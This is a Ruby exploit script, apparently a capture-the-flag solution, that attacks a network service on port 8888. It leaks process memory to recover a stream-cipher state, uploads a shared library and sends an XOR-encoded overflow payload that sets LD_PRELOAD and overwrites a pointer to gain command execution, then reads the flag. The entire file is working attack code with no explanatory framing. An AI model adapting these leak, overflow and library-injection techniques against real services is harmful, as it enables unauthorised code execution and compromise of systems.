require 'socket'

class Exploit
  def create_state(state)
    dict = (0..255).to_a
    state = state.bytes.to_a

    p state
    # check whether 2
    256.times do |x|
      print "OH : %d" % x if state.count(x) > 1
    end

    dict.each do |i|
      state.push(i) if not state.include?(i)
    end
  end

  def sxor(s1, s2)
    s1.bytes.zip(s2.bytes).map{|v| (v[0] ^ v[1]).chr}.join
  end

  def round(cnt)
    s1 = 0
    s2 = 0
    stream = ''

    cnt.times do |i|
      s2 = (s2 + 1) % 256
      s1 = (s1 + @s[s2]) % 256
      @s[s1], @s[s2] = @s[s2], @s[s1]
      stream += @s[(@s[s1] + @s[s2]) % 256].chr
    end
    return stream
  end

  def extract(addr)
    s = TCPSocket.new('54.64.101.236', 8888)
    #s = TCPSocket.new('localhost', 8888)
    puts s.readline
    puts s.write("\x00" * 8 + [addr].pack('Q') * 40 + "\n")
    puts s.read("Hmm...".length)
    5.times { puts s.read(1) }

    extracted = ""
    loop do
      extracted += s.readline
      break if extracted.index("terminated")
    end
    s.close()

    return extracted[33..-13]
  end

  def extract_state
#    @s = [170, 17, 79, 138, 225, 85, 57, 113, 223, 54, 127, 248, 27, 169, 12, 136, 35, 107, 222, 43, 199, 25, 229, 52, 77, 90, 144, 72, 212, 36, 134, 188, 142, 88, 140, 55, 120, 254, 93, 69, 114, 252, 126, 82, 139, 61, 106, 207, 201, 8, 238, 86, 44, 240, 101, 65, 76, 92, 215, 22, 171, 103, 192, 96, 63, 163, 70, 234, 129, 23, 202, 226, 178, 197, 46, 125, 133, 119, 74, 214, 42, 181, 213, 2, 185, 124, 130, 235, 164, 194, 30, 60, 162, 230, 224, 109, 208, 221, 160, 67, 232, 174, 26, 247, 182, 28, 118, 156, 73, 5, 149, 186, 62, 123, 7, 216, 204, 147, 143, 167, 154, 45, 173, 29, 16, 153, 32, 50, 191, 131, 157, 152, 117, 48, 203, 148, 236, 196, 151, 227, 200, 91, 135, 87, 132, 211, 49, 3, 165, 253, 39, 205, 102, 137, 128, 242, 64, 255, 15, 158, 190, 94, 104, 11, 183, 172, 179, 187, 112, 245, 177, 150, 10, 19, 193, 209, 33, 95, 115, 210, 24, 31, 250, 21, 161, 180, 37, 1, 18, 241, 97, 146, 13, 68, 89, 155, 58, 145, 176, 141, 6, 108, 219, 121, 218, 198, 51, 116, 228, 99, 105, 231, 75, 53, 38, 184, 9, 251, 100, 34, 71, 244, 47, 20, 166, 239, 40, 66, 4, 84, 78, 246, 56, 175, 249, 110, 237, 111, 98, 243, 122, 59, 168, 195, 159, 0, 233, 189, 206, 80, 81, 217, 220, 14, 41, 83]
    @s = [134, 4, 19, 53, 199, 70, 147, 252, 198, 59, 164, 17, 146, 85, 141, 253, 129, 235, 99, 212, 90, 23, 81, 46, 140, 62, 191, 111, 209, 98, 223, 64, 48, 161, 63, 163, 139, 94, 20, 5, 130, 133, 151, 55, 195, 109, 83, 33, 254, 196, 207, 26, 186, 38, 135, 49, 97, 202, 233, 88, 154, 131, 65, 193, 114, 2, 1, 100, 244, 27, 96, 226, 3, 105, 182, 138, 30, 170, 78, 239, 229, 248, 218, 153, 108, 67, 165, 77, 93, 166, 172, 144, 143, 60, 145, 246, 56, 171, 251, 205, 189, 224, 95, 42, 112, 35, 125, 124, 89, 29, 250, 203, 6, 128, 210, 45, 58, 73, 32, 158, 183, 132, 102, 51, 76, 39, 80, 150, 122, 219, 177, 167, 148, 41, 241, 230, 208, 87, 159, 217, 10, 72, 156, 149, 7, 84, 11, 175, 231, 228, 216, 57, 169, 79, 243, 225, 184, 47, 116, 16, 157, 240, 115, 119, 126, 113, 9, 121, 37, 181, 40, 31, 137, 234, 82, 12, 152, 173, 215, 197, 22, 245, 24, 15, 25, 179, 136, 50, 28, 75, 8, 249, 92, 211, 176, 14, 91, 185, 103, 52, 44, 222, 110, 0, 238, 206, 192, 220, 168, 69, 160, 61, 255, 118, 117, 242, 21, 237, 236, 204, 200, 127, 71, 68, 180, 101, 104, 155, 247, 232, 86, 178, 221, 227, 43, 201, 54, 214, 74, 18, 36, 66, 213, 187, 13, 120, 188, 107, 106, 190, 123, 174, 162, 194, 142, 34]
    return

    state = ''
    addr = 0x602160
    loop do
      state += extract(addr)
      break if state.length == 256
      state += "\x00"
      addr += state.length
    end
   @s = state.bytes.to_a
   p @s
  end

  def calc_food
    @favorite = "b33fb33feasytodigestb33f"
    @prefix = ["6231AA85BDBF9FF38A020C75AC23ABE482C5257AEFBDC961\x00"].pack('H*')
#    enc = ["6231AA85BDBF9FF38A020C75AC23ABE482C5257AEFBDC961"].pack('H*')
#    @favorite = sxor(enc, round(24))
  end

  def write_lib()
    s = TCPSocket.new('localhost', 8888)
    puts s.readline
    s.write(@favorite + "\n")
    puts s.read("Hmm...".length)
    5.times { puts s.read(1) }
    puts s.readline
    puts s.readline
    File.open('libexploit.so', 'rb') do |f|
      s.write(f.read() + "\n")
    end
    s.close()
  end

  def execute()
    #s = TCPSocket.new('54.64.101.236', 8888)
    s = TCPSocket.new('localhost', 8888)
    puts s.readline
    payload = @prefix + "A" *15 + "LD_PRELOAD=./message\x00\x00\x00\x00"
    payload = sxor(payload, round(payload.length))
    payload = payload.ljust(280, "A")
    payload += [0x0].pack('Q') * 2
    payload += [0x602148].pack('Q')
    payload += [0x0].pack('Q')

    puts s.write(payload + "\n")
    puts s.read("Hmm...".length)
    5.times { puts s.read(1) }
    puts s.readline
    puts s.readline
    s.write("cat flag\n")
    puts s.readline
    s.close()
  end

  def initialize
    extract_state()
    calc_food()

    write_lib()
    execute()
  end
end

s = Exploit.new
